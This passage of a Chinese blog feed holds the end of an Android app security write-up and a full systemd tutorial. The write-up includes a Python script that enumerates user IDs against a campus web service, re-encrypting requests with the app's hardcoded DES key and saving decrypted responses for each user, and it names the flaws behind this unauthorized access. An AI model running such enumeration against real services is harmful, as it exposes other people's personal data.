class="hljs-string">&#x27;&lt;/string&gt;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&lt;string xmlns=&quot;http://tempuri.org/&quot;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> encrypted_string <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        decrypted_string = des_decrypt(encrypted_string, key)<br>        <span class="hljs-keyword">return</span> decrypted_string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_and_write_data</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-comment"># 这里可以放置您要并发执行的任务逻辑</span><br>    <span class="hljs-comment"># Replace &#x27;密钥&#x27; with your actual key (8 bytes)</span><br>    key = <span class="hljs-string">b&#x27;密钥&#x27;</span><br>    data = base64.b64decode(<span class="hljs-string">&#x27;解密后的base64请求&#x27;</span>)<br>    data = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;userid&#x27;</span>,<span class="hljs-built_in">str</span>(i)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    encrypted_data = des_encrypt(key, data)<br><br>    <span class="hljs-comment"># Convert the encrypted data to Base64</span><br>    encrypted_base64 = base64.b64encode(encrypted_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment"># print(encrypted_base64)</span><br>    encrypted_base64 = parse.quote(encrypted_base64)<br>    <span class="hljs-comment"># print(encrypted_base64)</span><br>    url = <span class="hljs-string">&quot;http://xxx.xxxxx.edu.cn/campuxxxxxxxxx/xxxxxxxx.asmx/xxxxxService&quot;</span><br>    response = send_post_request(url, <span class="hljs-string">&quot;order=&quot;</span>+encrypted_base64)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">with</span> file_write_lock:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;info.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;\t&#x27;</span>+extract_string_value(response.text, key)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed!&quot;</span>)<br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    data_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(userid_start, userid_stop))<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># 使用executor.map并发执行任务</span><br>        executor.<span class="hljs-built_in">map</span>(process_and_write_data, data_list)<br>        <br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>主要的问题是使用了硬编码密钥、不安全的加密算法、没有对APP加固、没有鉴权策略导致水平越权等一系列安全问题。</p><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>base64编码解码：<a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p><p>url编解码：<a href="https://www.iamwawa.cn/urldecode.html">在线URL解码编码工具_蛙蛙工具 (iamwawa.cn)</a></p><p>DES在线加解密：<a href="https://the-x.cn/cryptography/Des.aspx">DES在线解密 DES在线加密 des hex - The X 在线工具 (the-x.cn)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Systemd介绍</title>
    <link href="/blog/2023/11/17/Linux-Systemd%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2023/11/17/Linux-Systemd%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>Systemd 是 Linux 系统工具，用来启动守护进程，已成为大多数发行版的标准配置。</strong></p><p><img src="/images/fj69.jpg"></p><span id="more"></span><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><p>守护进程（daemon）是指在UNIX或其他多任务操作系统中在后台执行的电脑程序，并不会接受电脑用户的直接操控。此类程序会被以进程的形式初始化。守护进程程序的名称通常以字母“d”结尾：例如，syslogd就是指管理系统日志的守护进程。用户退出session之后，“后台任务是否会继续执行”是判定这一任务是否为“守护进程”的依据。</p><h2 id="Systemd概述"><a href="#Systemd概述" class="headerlink" title="Systemd概述"></a>Systemd概述</h2><p>Systemd出现前，Linux的服务已知采用init进程启动，例如运行下面的命令可以启动apache服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /etc/init.d/apache2 start<br><span class="hljs-comment"># or</span><br>service apache2 start<br></code></pre></td></tr></table></figure><p>优于init是串行启动，只有前一个进程启动结束才能继续，因此这种方法启动时间比较长，并且init进程只执行启动脚本，不管其他事情，因此启动脚本会非常复杂。</p><p>Systemd 就是为了解决这些问题而诞生的。它的设计目标是，为系统的启动和管理提供一套完整的解决方案。</p><p>根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。</p><p>Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。下图是Systemd体系架构图：</p><p><img src="/images/systemd.png"></p><h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><p>Systemd不是一个命令，而是一组涉及到系统方方面面的一组命令。</p><h3 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h3><p>Systemd 的主命令，用于管理系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重启系统</span><br>$ sudo systemctl reboot<br><br><span class="hljs-comment"># 关闭系统，切断电源</span><br>$ sudo systemctl poweroff<br><br><span class="hljs-comment"># CPU停止工作</span><br>$ sudo systemctl halt<br><br><span class="hljs-comment"># 暂停系统</span><br>$ sudo systemctl <span class="hljs-built_in">suspend</span><br><br><span class="hljs-comment"># 让系统进入冬眠状态</span><br>$ sudo systemctl hibernate<br><br><span class="hljs-comment"># 让系统进入交互式休眠状态</span><br>$ sudo systemctl hybrid-sleep<br><br><span class="hljs-comment"># 启动进入救援状态（单用户状态）</span><br>$ sudo systemctl rescue<br></code></pre></td></tr></table></figure><h3 id="systemd-analyze"><a href="#systemd-analyze" class="headerlink" title="systemd-analyze"></a>systemd-analyze</h3><p>用于查看启动耗时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看启动耗时</span><br>$ systemd-analyze   <br><br><span class="hljs-comment"># 查看每个服务的启动耗时</span><br>$ systemd-analyze blame<br><br><span class="hljs-comment"># 显示瀑布状的启动过程流</span><br>$ systemd-analyze critical-chain<br><br><span class="hljs-comment"># 显示指定服务的启动流</span><br>$ systemd-analyze critical-chain atd.service<br></code></pre></td></tr></table></figure><h3 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h3><p>查看主机信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hostnamectl<br>   Static hostname: ubuntu<br>         Icon name: computer-vm<br>           Chassis: vm<br>        Machine ID: <br>           Boot ID: <br>    Virtualization: vmware<br>  Operating System: Ubuntu 18.04.6 LTS<br>            Kernel: Linux 5.4.0-150-generic<br>      Architecture: x86-64<br><span class="hljs-comment"># 设置主机名。</span><br>$ sudo hostnamectl set-hostname <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h3 id="localectl"><a href="#localectl" class="headerlink" title="localectl"></a>localectl</h3><p>显示本地化信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ localectl<br>   System Locale: LANG=en_US.UTF-8<br>       VC Keymap: n/a<br>      X11 Layout: us<br>       X11 Model: SKIP<br><span class="hljs-comment"># 设置本地化参数。</span><br>$ sudo localectl set-locale LANG=en_GB.utf8<br>$ sudo localectl set-keymap en_GB<br></code></pre></td></tr></table></figure><h3 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h3><p>显示当前时区设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ timedatectl<br>                      Local time: Fri 2023-11-17 03:42:56 PST<br>                  Universal time: Fri 2023-11-17 11:42:56 UTC<br>                        RTC time: Fri 2023-11-17 11:42:56<br>                       Time zone: America/Los_Angeles (PST, -0800)<br>       System clock synchronized: <span class="hljs-built_in">yes</span><br>systemd-timesyncd.service active: <span class="hljs-built_in">yes</span><br>                 RTC <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> TZ: no<br>                 <br><span class="hljs-comment"># 显示所有可用的时区</span><br>$ timedatectl list-timezones                                                                                   <br><span class="hljs-comment"># 设置当前时区</span><br>$ sudo timedatectl set-timezone Asia/Shanghai<br>$ sudo timedatectl set-time YYYY-MM-DD<br>$ sudo timedatectl set-time HH:MM:SS<br></code></pre></td></tr></table></figure><h3 id="loginctl"><a href="#loginctl" class="headerlink" title="loginctl"></a>loginctl</h3><p>查看当前登录的用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ loginctl<br>   SESSION        UID USER             SEAT             TTY             <br>        c1        121 gdm              seat0            tty1            <br>         2       1000 user             seat0            tty2            <br><span class="hljs-comment"># 列出当前session</span><br>$ loginctl list-sessions<br><br><span class="hljs-comment"># 列出当前登录用户</span><br>$ loginctl list-users<br><br><span class="hljs-comment"># 列出显示指定用户的信息</span><br>$ loginctl show-user user<br></code></pre></td></tr></table></figure><h2 id="Unit"><a href="#Unit" class="headerlink" title="Unit"></a>Unit</h2><p>Systemd 可以管理所有系统资源。不同的资源统称为 Unit（单位）。</p><p>Unit 一共分成12种：</p><ul><li>Service unit：系统服务</li><li>Target unit：多个 Unit 构成的一个组</li><li>Device Unit：硬件设备</li><li>Mount Unit：文件系统的挂载点</li><li>Automount Unit：自动挂载点</li><li>Path Unit：文件或路径</li><li>Scope Unit：不是由 Systemd 启动的外部进程</li><li>Slice Unit：进程组</li><li>Snapshot Unit：Systemd 快照，可以切回某个快照</li><li>Socket Unit：进程间通信的 socket</li><li>Swap Unit：swap 文件</li><li>Timer Unit：定时器</li></ul><p>查看unit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出正在运行的 Unit</span><br>$ systemctl list-units<br><br><span class="hljs-comment"># 列出所有Unit，包括没有找到配置文件的或者启动失败的</span><br>$ systemctl list-units --all<br><br><span class="hljs-comment"># 列出所有没有运行的 Unit</span><br>$ systemctl list-units --all --state=inactive<br><br><span class="hljs-comment"># 列出所有加载失败的 Unit</span><br>$ systemctl list-units --failed<br><br><span class="hljs-comment"># 列出所有正在运行的、类型为 service 的 Unit</span><br>$ systemctl list-units --<span class="hljs-built_in">type</span>=service<br></code></pre></td></tr></table></figure><h3 id="Unit状态"><a href="#Unit状态" class="headerlink" title="Unit状态"></a>Unit状态</h3><p><code>systemctl status</code>命令用于查看系统状态和单个 Unit 的状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 显示系统状态</span><br>$ systemctl status<br><br><span class="hljs-comment"># 显示单个 Unit 的状态</span><br>$ sysystemctl status dbus.service<br><br><span class="hljs-comment"># 显示远程主机的某个 Unit 的状态</span><br>$ systemctl -H root@remotehost status httpd.service<br></code></pre></td></tr></table></figure><h3 id="Unit管理"><a href="#Unit管理" class="headerlink" title="Unit管理"></a>Unit管理</h3><p>我们常用的用于启动和停止 Unit命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 立即启动一个服务</span><br>$ sudo systemctl start apache.service<br><br><span class="hljs-comment"># 立即停止一个服务</span><br>$ sudo systemctl stop apache.service<br><br><span class="hljs-comment"># 重启一个服务</span><br>$ sudo systemctl restart apache.service<br><br><span class="hljs-comment"># 杀死一个服务的所有子进程</span><br>$ sudo systemctl <span class="hljs-built_in">kill</span> apache.service<br><br><span class="hljs-comment"># 重新加载一个服务的配置文件</span><br>$ sudo systemctl reload apache.service<br><br><span class="hljs-comment"># 重载所有修改过的配置文件</span><br>$ sudo systemctl daemon-reload<br><br><span class="hljs-comment"># 显示某个 Unit 的所有底层参数</span><br>$ systemctl show apache.service<br><br><span class="hljs-comment"># 显示某个 Unit 的指定属性的值</span><br>$ systemctl show -p CPUShares apache.service<br><br><span class="hljs-comment"># 设置某个 Unit 的指定属性</span><br>$ sudo systemctl set-property apache.service CPUShares=500<br></code></pre></td></tr></table></figure><h3 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h3><p>Unit 之间存在依赖关系：A 依赖于 B，就意味着 Systemd 在启动 A 的时候，同时会去启动 B。</p><p><code>systemctl list-dependencies</code>命令列出一个 Unit 的所有依赖，上面命令的输出结果之中，有些依赖是 Target 类型（详见下文），默认不会展开显示。如果要展开 Target，就需要使用<code>--all</code>参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ systemctl list-dependencies nginx.service<br><span class="hljs-comment"># 展开Target</span><br>$ systemctl list-dependencies --all nginx.service<br></code></pre></td></tr></table></figure><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>每一个 Unit 都有一个配置文件，告诉 Systemd 怎么启动这个 Unit 。</p><p>Systemd 默认从目录<code>/etc/systemd/system/</code>读取配置文件。但是，里面存放的大部分文件都是符号链接，指向目录<code>/usr/lib/systemd/system/</code>，真正的配置文件存放在那个目录。<code>systemctl enable</code>命令用于在上面两个目录之间，建立符号链接关系。</p><p>配置文件的后缀名，就是该 Unit 的种类，比如<code>sshd.socket</code>。如果省略，Systemd 默认后缀名为<code>.service</code>，所以<code>sshd</code>会被理解成<code>sshd.service</code></p><p><code>systemctl list-unit-files</code>命令用于列出所有配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有配置文件</span><br>$ systemctl list-unit-files<br>UNIT FILE                                  STATE          <br>proc-sys-fs-binfmt_misc.automount          static         <br>-.mount                                    generated      <br>dev-hugepages.mount                        static         <br>dev-mqueue.mount                           static         <br>media-floppy0.mount                        generated      <br>proc-sys-fs-binfmt_misc.mount              static         <br>run-vmblock\x2dfuse.mount                  enabled        <br>snap-bare-5.mount                          enabled    <br><br><span class="hljs-comment"># 列出指定类型的配置文件</span><br>$ systemctl list-unit-files --<span class="hljs-built_in">type</span>=service<br>UNIT FILE                                  STATE          <br>accounts-daemon.service                    enabled        <br>acpid.service                              disabled       <br>alsa-restore.service                       static         <br>alsa-state.service                         static         <br>alsa-utils.service                         masked         <br>anacron.service                            enabled        <br>apparmor.service                           enabled  <br></code></pre></td></tr></table></figure><ul><li>enabled：已建立启动链接</li><li>disabled：没建立启动链接</li><li>static：该配置文件没有<code>[Install]</code>部分（无法执行），只能作为其他配置文件的依赖</li><li>masked：该配置文件被禁止建立启动链接</li></ul><p>一旦修改配置文件，就要让 Systemd 重新加载配置文件，然后重新启动，否则修改不会生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo systemctl daemon-reload<br>$ sudo systemctl restart xxx.service<br></code></pre></td></tr></table></figure><h3 id="配置文件格式"><a href="#配置文件格式" class="headerlink" title="配置文件格式"></a>配置文件格式</h3><p><code>systemctl cat</code>命令可以查看配置文件的内容，配置文件分成几个区块，每个区块的第一行，是用方括号表示的区别名，比如<code>[Unit]</code>。注意，配置文件的区块名和字段名，都是大小写敏感的。区块内部是一些等号连接的键值对。</p><p>配置文件字段信息详见：<a href="https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html">systemd.unit</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>启动计算机的时候，需要启动大量的 Unit。如果每一次启动，都要一一写明本次启动需要哪些 Unit，显然非常不方便。Systemd 的解决方案就是 Target。</p><p>简单说，Target 就是一个 Unit 组，包含许多相关的 Unit 。启动某个 Target 的时候，Systemd 就会启动里面所有的 Unit。从这个意义上说，Target 这个概念类似于”状态点”，启动某个 Target 就好比启动到某种状态。</p><p>传统的<code>init</code>启动模式里面，有 RunLevel 的概念，跟 Target 的作用很类似。不同的是，RunLevel 是互斥的，不可能多个 RunLevel 同时启动，但是多个 Target 可以同时启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前系统的所有 Target</span><br>$ systemctl list-unit-files --<span class="hljs-built_in">type</span>=target<br><br><span class="hljs-comment"># 查看一个 Target 包含的所有 Unit</span><br>$ systemctl list-dependencies multi-user.target<br><br><span class="hljs-comment"># 查看启动时的默认 Target</span><br>$ systemctl get-default<br><br><span class="hljs-comment"># 设置启动时的默认 Target</span><br>$ sudo systemctl set-default multi-user.target<br><br><span class="hljs-comment"># 切换 Target 时，默认不关闭前一个 Target 启动的进程，</span><br><span class="hljs-comment"># systemctl isolate 命令改变这种行为，</span><br><span class="hljs-comment"># 关闭前一个 Target 里面所有不属于后一个 Target 的进程</span><br>$ sudo systemctl isolate multi-user.target<br></code></pre></td></tr></table></figure><p>Target与RunLevel的对应关系：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>Traditional runlevel      New target <span class="hljs-keyword">name</span>     Symbolically linked to<br><br>R<span class="hljs-function"><span class="hljs-title">unlevel</span> 0           |    runlevel0.target -&gt;</span> poweroff.target<br>R<span class="hljs-function"><span class="hljs-title">unlevel</span> 1           |    runlevel1.target -&gt;</span> rescue.target<br>R<span class="hljs-function"><span class="hljs-title">unlevel</span> 2           |    runlevel2.target -&gt;</span> multi-user.target<br>R<span class="hljs-function"><span class="hljs-title">unlevel</span> 3           |    runlevel3.target -&gt;</span> multi-user.target<br>R<span class="hljs-function"><span class="hljs-title">unlevel</span> 4           |    runlevel4.target -&gt;</span> multi-user.target<br>R<span class="hljs-function"><span class="hljs-title">unlevel</span> 5           |    runlevel5.target -&gt;</span> graphical.target<br>R<span class="hljs-function"><span class="hljs-title">unlevel</span> 6           |    runlevel6.target -&gt;</span> reboot.target<br></code></pre></td></tr></table></figure><p>systemd与init主要的差别：</p><p>（1）默认的 RunLevel（在<code>/etc/inittab</code>文件设置）现在被默认的 Target 取代，位置是<code>/etc/systemd/system/default.target</code>，通常符号链接到<code>graphical.target</code>（图形界面）或者<code>multi-user.target</code>（多用户命令行）。</p><p>（2）启动脚本的位置，以前是<code>/etc/init.d</code>目录，符号链接到不同的 RunLevel 目录 （比如<code>/etc/rc3.d</code>、<code>/etc/rc5.d</code>等），现在则存放在<code>/lib/systemd/system</code>和<code>/etc/systemd/system</code>目录。</p><p>（3）配置文件的位置，以前<code>init</code>进程的配置文件是<code>/etc/inittab</code>，各种服务的配置文件存放在<code>/etc/sysconfig</code>目录。现在的配置文件主要存放在<code>/lib/systemd</code>目录，在<code>/etc/systemd</code>目录里面的修改可以覆盖原始设置。</p><h2 id="journalctl"><a href="#journalctl" class="headerlink" title="journalctl"></a>journalctl</h2><p>Systemd 统一管理所有 Unit 的启动日志。带来的好处就是，可以只用<code>journalctl</code>一个命令，查看所有日志（内核日志和应用日志）。日志的配置文件是<code>/etc/systemd/journald.conf</code></p><p>常用的查看日志命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有日志（默认情况下 ，只保存本次启动的日志）</span><br>$ sudo journalctl<br><br><span class="hljs-comment"># 查看内核日志（不显示应用日志）</span><br>$ sudo journalctl -k<br><br><span class="hljs-comment"># 查看系统本次启动的日志</span><br>$ sudo journalctl -b<br>$ sudo journalctl -b -0<br><br><span class="hljs-comment"># 查看上一次启动的日志（需更改设置）</span><br>$ sudo journalctl -b -1<br><br><span class="hljs-comment"># 查看指定时间的日志</span><br>$ sudo journalctl --since=<span class="hljs-string">&quot;2012-10-30 18:17:16&quot;</span><br>$ sudo journalctl --since <span class="hljs-string">&quot;20 min ago&quot;</span><br>$ sudo journalctl --since yesterday<br>$ sudo journalctl --since <span class="hljs-string">&quot;2015-01-10&quot;</span> --until <span class="hljs-string">&quot;2015-01-11 03:00&quot;</span><br>$ sudo journalctl --since 09:00 --until <span class="hljs-string">&quot;1 hour ago&quot;</span><br><br><span class="hljs-comment"># 显示尾部的最新10行日志</span><br>$ sudo journalctl -n<br><br><span class="hljs-comment"># 显示尾部指定行数的日志</span><br>$ sudo journalctl -n 20<br><br><span class="hljs-comment"># 实时滚动显示最新日志</span><br>$ sudo journalctl -f<br><br><span class="hljs-comment"># 查看指定服务的日志</span><br>$ sudo journalctl /usr/lib/systemd/systemd<br><br><span class="hljs-comment"># 查看指定进程的日志</span><br>$ sudo journalctl _PID=1<br><br><span class="hljs-comment"># 查看某个路径的脚本的日志</span><br>$ sudo journalctl /usr/bin/bash<br><br><span class="hljs-comment"># 查看指定用户的日志</span><br>$ sudo journalctl _UID=33 --since today<br><br><span class="hljs-comment"># 查看某个 Unit 的日志</span><br>$ sudo journalctl -u nginx.service<br>$ sudo journalctl -u nginx.service --since today<br><br><span class="hljs-comment"># 实时滚动显示某个 Unit 的最新日志</span><br>$ sudo journalctl -u nginx.service -f<br><br><span class="hljs-comment"># 合并显示多个 Unit 的日志</span><br>$ journalctl -u nginx.service -u php-fpm.service --since today<br><br><span class="hljs-comment"># 查看指定优先级（及其以上级别）的日志，共有8级</span><br><span class="hljs-comment"># 0: emerg</span><br><span class="hljs-comment"># 1: alert</span><br><span class="hljs-comment"># 2: crit</span><br><span class="hljs-comment"># 3: err</span><br><span class="hljs-comment"># 4: warning</span><br><span class="hljs-comment"># 5: notice</span><br><span class="hljs-comment"># 6: info</span><br><span class="hljs-comment"># 7: debug</span><br>$ sudo journalctl -p err -b<br><br><span class="hljs-comment"># 日志默认分页输出，--no-pager 改为正常的标准输出</span><br>$ sudo journalctl --no-pager<br><br><span class="hljs-comment"># 以 JSON 格式（单行）输出</span><br>$ sudo journalctl -b -u nginx.service -o json<br><br><span class="hljs-comment"># 以 JSON 格式（多行）输出，可读性更好</span><br>$ sudo journalctl -b -u nginx.serviceqq<br> -o json-pretty<br><br><span class="hljs-comment"># 显示日志占据的硬盘空间</span><br>$ sudo journalctl --disk-usage<br><br><span class="hljs-comment"># 指定日志文件占据的最大空间</span><br>$ sudo journalctl --vacuum-size=1G<br><br><span class="hljs-comment"># 指定日志文件保存多久</span><br>$ sudo journalctl --vacuum-time=1years<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows&amp;Linux后门技术初探</title>
